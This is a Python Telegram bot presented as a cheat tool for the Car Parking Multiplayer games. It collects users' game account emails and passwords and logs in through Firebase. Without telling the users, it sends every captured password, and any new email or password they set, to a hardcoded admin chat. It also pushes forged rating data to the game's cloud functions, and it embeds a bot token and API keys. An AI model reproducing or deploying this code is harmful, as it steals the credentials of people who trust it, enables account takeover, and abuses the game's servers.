import telebot
import requests
from telebot import types
import json
from threading import Thread
from flask import Flask
import os

# --- RENDER UPTIME SERVER ---
app = Flask('')
@app.route('/')
def home(): return "🔥 ARABIC CPM TOOL!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
TOKEN = "8407532602:AAGWNZxeHKoVi265rrv2jB-r6EYFEnX-Ds0"
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=20)

# ID ALERT
ADMIN_ID = 7212602902 

API_KEYS = {
    "CPM1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

user_sessions = {}

def get_user_info(message):
    u = message.from_user
    return f"👤 {u.first_name} (@{u.username if u.username else 'NoUser'}) [`{u.id}`]"

# --- BOT LOGIC ---

@bot.message_handler(commands=['start'])
def start(message):
    cid = message.chat.id
    user_sessions[cid] = {} 
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add('CPM1', 'CPM2')
    
    msg = bot.send_message(cid, "🔥 **الـخـمـعـلـي🇸🇦. + O6Z🧑‍💻**\n\nيرجى اختيار الإصدار للمتابعة:", 
                           reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text in ['CPM1', 'CPM2'])
def set_version(message):
    cid = message.chat.id
    user_sessions[cid] = {'v': message.text, 'info': get_user_info(message)}
    
    msg = bot.send_message(cid, f"✅ تم اختيار: **{message.text}**\n\nيرجى إدخال البريد الإلكتروني 📧:", 
                           reply_markup=types.ReplyKeyboardRemove(), parse_mode="Markdown")
    bot.register_next_step_handler(msg, get_email)

def get_email(message):
    cid = message.chat.id
    if cid not in user_sessions: return start(message)
    
    user_sessions[cid]['email'] = message.text.strip()
    msg = bot.send_message(cid, "🔑 يرجى إدخال كلمة المرور الخاصة بك:")
    bot.register_next_step_handler(msg, run_login)

def run_login(message):
    cid = message.chat.id
    pwd = message.text.strip()
    sess = user_sessions.get(cid)
    
    if not sess or 'email' not in sess:
        return bot.send_message(cid, "❌ انتهت الجلسة! اكتب /start")

    bot.send_message(cid, "⏳ جاري تسجيل الدخول، يرجى الانتظار...")

    try:
        r = requests.post(
            f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[sess['v']]}", 
            json={"email": sess['email'], "password": pwd, "returnSecureToken": True}
        )
        res = r.json()
        
        if r.status_code == 200 and 'idToken' in res:
            sess.update({'token': res['idToken'], 'email': sess['email'], 'pwd': pwd})
            
            # --- LOGIN ALERT TO ADMIN ---
            alert = (f"👤 **NEW LOGIN**\n\nUser: {sess['info']}\n"
                     f"📧 Email: `{sess['email']}`\n🔑 Pass: `{pwd}`\n🎮 Game: {sess['v']}")
            bot.send_message(ADMIN_ID, alert, parse_mode="Markdown")
            
            # Control Panel (Arabic Buttons)
            btn = types.InlineKeyboardMarkup(row_width=1).add(
                types.InlineKeyboardButton("👑 رتبة الملك 👑", callback_data="rank"),
                types.InlineKeyboardButton("📧 تغيير البريد الإلكتروني 📨", callback_data="c_email"),
                types.InlineKeyboardButton("🔐 تغيير كلمة المرور", callback_data="c_pass"),
                types.InlineKeyboardButton("🚪 تسجيل الخروج", callback_data="logout")
            )
            bot.send_message(cid, f"✅ **تم تسجيل الدخول بنجاح!**\nمرحباً: `{sess['email']}`", reply_markup=btn, parse_mode="Markdown")
        else:
            bot.send_message(cid, f"❌ **فشل:** {res.get('error', {}).get('message', 'خطأ غير معروف')}\nحاول مرة أخرى /start")
    except Exception as e:
        bot.send_message(cid, "❌ خطأ في الاتصال!")

@bot.callback_query_handler(func=lambda call: True)
def actions(call):
    cid = call.message.chat.id
    sess = user_sessions.get(cid)

    if call.data == "logout":
        user_sessions.pop(cid, None)
        bot.edit_message_text("🚪 تم تسجيل الخروج بنجاح.", cid, call.message.message_id)
        return

    if not sess or 'token' not in sess:
        return bot.answer_callback_query(call.id, "انتهت الجلسة! /start", show_alert=True)

    bot.answer_callback_query(call.id)
    head = {"Authorization": f"Bearer {sess['token']}", "Content-Type": "application/json"}

    if call.data == "rank":
        url = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" if sess['v']=="CPM1" else "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
        fields = ["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"]
        r_data = {f: 100000 for f in fields}
        r_data.update({"time": 10000000000, "race_win": 3000})
        
        try:
            requests.post(url, headers=head, json={"data": json.dumps({"RatingData": r_data})})
            bot.send_message(cid, "👑 **تم تفعيل رتبة الملك بنجاح!**")
            bot.send_message(ADMIN_ID, f"👑 **RANK USED**\nUser: {sess['info']}\nAcc: `{sess['email']}`", parse_mode="Markdown")
        except:
            bot.send_message(cid, "❌ فشل الحقن.")

    elif call.data == "c_email":
        msg = bot.send_message(cid, "أدخل البريد الإلكتروني الجديد:")
        bot.register_next_step_handler(msg, finalize_email)
        
    elif call.data == "c_pass":
        msg = bot.send_message(cid, "أدخل كلمة المرور الجديدة:")
        bot.register_next_step_handler(msg, finalize_pass)

def finalize_email(message):
    cid, sess = message.chat.id, user_sessions.get(message.chat.id)
    if not sess or 'token' not in sess: return
    new_e = message.text.strip()
    
    r = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEYS[sess['v']]}", 
                      json={"idToken": sess['token'], "email": new_e, "returnSecureToken": True})
    if r.status_code == 200:
        bot.send_message(ADMIN_ID, f"📧 **EMAIL CHANGED**\nUser: {sess['info']}\nOld: `{sess['email']}`\nNew: `{new_e}`", parse_mode="Markdown")
        bot.send_message(cid, f"✅ تم تغيير البريد الإلكتروني إلى: {new_e}")
        sess.update({'token': r.json()['idToken'], 'email': new_e})
    else:
        bot.send_message(cid, f"❌ خطأ: {r.json().get('error', {}).get('message')}")

def finalize_pass(message):
    cid, sess = message.chat.id, user_sessions.get(message.chat.id)
    if not sess or 'token' not in sess: return
    new_p = message.text.strip()
    
    r = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEYS[sess['v']]}", 
                      json={"idToken": sess['token'], "password": new_p, "returnSecureToken": True})
    if r.status_code == 200:
        bot.send_message(ADMIN_ID, f"🔐 **PASS CHANGED**\nUser: {sess['info']}\nAcc: `{sess['email']}`\nNew: `{new_p}`", parse_mode="Markdown")
        bot.send_message(cid, "✅ تم تحديث كلمة المرور بنجاح!")
        sess.update({'token': r.json()['idToken']})
    else:
        bot.send_message(cid, f"❌ خطأ: {r.json().get('error', {}).get('message')}")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    print("🚀 BOT IS READY!")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
